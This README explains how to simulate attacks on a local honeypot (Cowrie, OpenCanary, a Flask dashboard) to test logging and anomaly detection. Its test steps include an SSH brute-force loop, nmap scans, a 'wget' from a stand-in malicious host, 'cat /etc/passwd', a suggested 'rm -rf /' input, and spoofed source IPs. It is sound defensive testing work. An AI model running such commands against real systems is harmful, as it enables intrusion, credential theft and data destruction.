# Simulating Attacks for Honeypot Testing

This README explains how to simulate attacks against your honeypot system to test detection, logging, and anomaly detection. These attacks are fake (local or scripted), but they trigger the same logic as a real attacker would. This helps test everything from log parsing to anomaly flagging.

---

##
Requirements

Before simulating, make sure:

- Cowrie is running (SSH honeypot)
- OpenCanary is running (multi-protocol honeypot)
- Flask backend is up (to capture and display logs)
- Anomaly detection code is active
- SQLite DB is properly storing logs

---

## Simulating SSH Login Attacks (Cowrie)

You can simulate a brute-force SSH attack by making fake login attempts to the Cowrie SSH port (usually 2222 or 2223).

### 1. Terminal Login Attempts

```bash
ssh root@localhost -p 2222
```

- Try multiple usernames and passwords (can be random).
- Each attempt gets logged by Cowrie and sent to the backend.

Do this a few times quickly to simulate a brute-force scenario.

### 2. Looping Login Attempts (Fake Brute Force)

```bash
for i in {1..20}; do
  sshpass -p "wrongpass$i" ssh user$i@localhost -p 2222 -o StrictHostKeyChecking=no
done
```

> **Note**: `sshpass` may need to be installed. This simulates fast, automated login failures.

---

## Simulating OpenCanary Probes

OpenCanary listens for fake services. You can simulate scans or basic connections.

### 1. FTP Scan

```bash
ftp localhost
```

Or try connecting with `telnet localhost 21`.

### 2. HTTP Probe

```bash
curl http://localhost:80
```

### 3. MySQL/Redis Port Scan

Use `nmap` or a browser-based scan tool.

```bash
nmap -sV -p 3306,6379 localhost
```

This mimics attackers scanning for services.

---

## 🛠️ Simulating Custom Commands (Cowrie Shell)

After logging into the honeypot SSH, run:

```bash
wget http://malicious.site/malware.sh
cat /etc/passwd
ls -la /var/www
```

These mimic attacker behaviour. Cowrie logs the session, commands, and flags anomalies based on command length, structure, and frequency.

---

## Simulated Anomalies via Web Form (Optional)

If you implemented the simulated web interface for test attacks:

1. Go to `http://localhost:5000/simulate`
2. Enter:
   - Fake usernames/passwords
   - Fake commands like `rm -rf /` or `sudo wget ...`
3. These are posted to your backend just like real logs

Useful for testing your frontend detection + UI flow.

---

## What to Watch

- Flask terminal should show logs and parsed output
- Anomalies get saved in SQLite with `is_anomaly = True`
- You can view flags via the Flask dashboard
- You’ll see patterns like:
  - High login attempt frequency
  - Entropy in IPs or credentials
  - Unusual command sequences

---

## Simulate Spoofed IPs (Advanced)

To simulate fake or random IPs, modify test script to post directly to the API with fake source IPs.

```bash
curl -X POST http://localhost:5000/api/fake-log \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "123456", "src_ip": "101.23.45.66"}'
```

Rotate IPs in a script loop to simulate a botnet-style attack.

---

## Confirming Detection

Check database:

```bash
sqlite3 cowrie_events.db
SELECT * FROM events WHERE is_anomaly = 1;
```

Check your Flask dashboard for spikes in anomaly count or red flags.

---
